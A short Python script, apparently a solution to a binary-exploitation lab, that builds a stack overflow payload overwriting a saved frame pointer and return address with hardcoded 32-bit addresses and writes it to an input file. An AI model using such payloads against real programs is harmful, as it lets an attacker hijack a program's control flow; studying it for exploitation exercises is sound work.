import os, sys, struct


buf_input=b"1234567\x00"
other_vars=struct.pack("<L", 0x00000000)
other_vars+=struct.pack("<L", 0x00000000) 
other_vars+=struct.pack("<L", 0x00000000) 

ebp = 0xffffd638 # from main (option 1)
#ebp = 0xffffd698 # from main (option 2)
addr = 0x08048a50


exploit_input = buf_input + other_vars
exploit_input += struct.pack("<L", ebp)
exploit_input += struct.pack("<L", addr)

fp = open('in.txt', 'wb')
fp.write(exploit_input)
fp.flush()
